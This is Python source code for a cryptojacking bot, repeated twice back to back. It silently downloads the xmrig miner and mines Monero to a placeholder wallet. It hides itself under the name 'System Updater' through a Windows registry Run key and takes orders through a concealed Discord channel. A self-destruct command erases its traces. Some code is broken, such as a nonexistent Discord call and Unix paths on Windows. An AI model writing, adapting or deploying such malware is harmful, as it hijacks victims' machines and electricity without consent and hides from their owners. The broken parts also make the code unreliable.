import discord
import asyncio
from discord.ext import commands
import os
import psutil
import subprocess
import requests
import winreg
import shutil
import sys

# Set up Discord bot
bot = commands.Bot(command_prefix='!')
server_id = YOUR_SERVER_ID

# Set up mining parameters
pool_url = 'xmr.pool.supportxmr.com:7777'
wallet_address = 'YOUR_WALLET_ADDRESS'
cpu_usage = 15  # Default CPU usage percentage

# Function to download xmrig silently
def download_xmrig():
    url = 'https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-windows-x64.zip'
    response = requests.get(url, stream=True)
    with open('xmrig.zip', 'wb') as f:
        for chunk in response.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)

# Function to start mining
def start_mining():
    command = f'xmrig.exe --url={pool_url} --user={wallet_address} --threads={cpu_usage}'
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process

# Function to stop mining
def stop_mining(process):
    process.terminate()

# Command to start mining
@bot.command(name='start', help='Starts mining')
async def start(ctx):
    global process
    process = start_mining()
    await ctx.send('Mining started')

# Command to stop mining
@bot.command(name='stop', help='Stops mining')
async def stop(ctx):
    stop_mining(process)
    await ctx.send('Mining stopped')

# Command to set CPU usage
@bot.command(name='cpu', help='Sets CPU usage percentage')
async def cpu(ctx, usage: int):
    global cpu_usage
    cpu_usage = usage
    await ctx.send(f'CPU usage set to {usage}%')

# Command to show help
@bot.command(name='help', help='Shows help')
async def help(ctx):
    await ctx.send('Available commands:\n!start - Starts mining\n!stop - Stops mining\n!cpu <percentage> - Sets CPU usage percentage\n!help - Shows help\n!self_destruct - Self-destructs the bot')

# Command to self-destruct the bot
@bot.command(name='self_destruct', help='Self-destructs the bot')
async def self_destruct(ctx):
    # Stop mining process
    stop_mining(process)

    # Delete xmrig files
    shutil.rmtree('xmrig-6.18.0-windows-x64')

    # Remove persistence
    remove_persistence()

    # Delete the script file
    os.remove(sys.argv[0])

    # Delete the bot
    await bot.close()

# Function to add persistence through Windows startup and run registry
def add_persistence():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'System Updater', 0, winreg.REG_SZ, __file__)
    winreg.CloseKey(key)

# Function to remove persistence
def remove_persistence():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    try:
        winreg.DeleteValue(key, 'System Updater')
    except FileNotFoundError:
        pass
    winreg.CloseKey(key)

# Set up persistence
@bot.event
async def on_ready():
    if not os.path.exists('/tmp/miner'):
        os.makedirs('/tmp/miner')
    with open('/tmp/miner/pid', 'w') as f:
        f.write(str(os.getpid()))

    # Download xmrig silently
    download_xmrig()

    # Extract xmrig from zip file
    subprocess.run(['unzip', '-o', 'xmrig.zip', '-d', '.'])

    # Add persistence
    add_persistence()

    # Create a new channel for controlling the mining process
    guild = bot.get_guild(server_id)
    category = await guild.create_category('System Updater')
    channel = await guild.create_text_channel('system-updater', category=category)

    # Grant permissions to the bot to manage the channel
    await channel.set_permissions(guild.default_role, read_messages=False)
    await channel.set_permissions(bot.user, read_messages=True, send_messages=True)

    # Move the bot to the new channel
    await bot.change_presence(status=discord.Status.online, activity=discord.Game('System Updater'))
    await bot.move_to(channel)

# Run the bot
bot.run('YOUR_DISCORD_BOT_TOKEN')import discord
import asyncio
from discord.ext import commands
import os
import psutil
import subprocess
import requests
import winreg
import shutil
import sys

# Set up Discord bot
bot = commands.Bot(command_prefix='!')
server_id = YOUR_SERVER_ID

# Set up mining parameters
pool_url = 'xmr.pool.supportxmr.com:7777'
wallet_address = 'YOUR_WALLET_ADDRESS'
cpu_usage = 15  # Default CPU usage percentage

# Function to download xmrig silently
def download_xmrig():
    url = 'https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-windows-x64.zip'
    response = requests.get(url, stream=True)
    with open('xmrig.zip', 'wb') as f:
        for chunk in response.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)

# Function to start mining
def start_mining():
    command = f'xmrig.exe --url={pool_url} --user={wallet_address} --threads={cpu_usage}'
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process

# Function to stop mining
def stop_mining(process):
    process.terminate()

# Command to start mining
@bot.command(name='start', help='Starts mining')
async def start(ctx):
    global process
    process = start_mining()
    await ctx.send('Mining started')

# Command to stop mining
@bot.command(name='stop', help='Stops mining')
async def stop(ctx):
    stop_mining(process)
    await ctx.send('Mining stopped')

# Command to set CPU usage
@bot.command(name='cpu', help='Sets CPU usage percentage')
async def cpu(ctx, usage: int):
    global cpu_usage
    cpu_usage = usage
    await ctx.send(f'CPU usage set to {usage}%')

# Command to show help
@bot.command(name='help', help='Shows help')
async def help(ctx):
    await ctx.send('Available commands:\n!start - Starts mining\n!stop - Stops mining\n!cpu <percentage> - Sets CPU usage percentage\n!help - Shows help\n!self_destruct - Self-destructs the bot')

# Command to self-destruct the bot
@bot.command(name='self_destruct', help='Self-destructs the bot')
async def self_destruct(ctx):
    # Stop mining process
    stop_mining(process)

    # Delete xmrig files
    shutil.rmtree('xmrig-6.18.0-windows-x64')

    # Remove persistence
    remove_persistence()

    # Delete the script file
    os.remove(sys.argv[0])

    # Delete the bot
    await bot.close()

# Function to add persistence through Windows startup and run registry
def add_persistence():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'System Updater', 0, winreg.REG_SZ, __file__)
    winreg.CloseKey(key)

# Function to remove persistence
def remove_persistence():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    try:
        winreg.DeleteValue(key, 'System Updater')
    except FileNotFoundError:
        pass
    winreg.CloseKey(key)

# Set up persistence
@bot.event
async def on_ready():
    if not os.path.exists('/tmp/miner'):
        os.makedirs('/tmp/miner')
    with open('/tmp/miner/pid', 'w') as f:
        f.write(str(os.getpid()))

    # Download xmrig silently
    download_xmrig()

    # Extract xmrig from zip file
    subprocess.run(['unzip', '-o', 'xmrig.zip', '-d', '.'])

    # Add persistence
    add_persistence()

    # Create a new channel for controlling the mining process
    guild = bot.get_guild(server_id)
    category = await guild.create_category('System Updater')
    channel = await guild.create_text_channel('system-updater', category=category)

    # Grant permissions to the bot to manage the channel
    await channel.set_permissions(guild.default_role, read_messages=False)
    await channel.set_permissions(bot.user, read_messages=True, send_messages=True)

    # Move the bot to the new channel
    await bot.change_presence(status=discord.Status.online, activity=discord.Game('System Updater'))
    await bot.move_to(channel)

# Run the bot
bot.run('YOUR_DISCORD_BOT_TOKEN')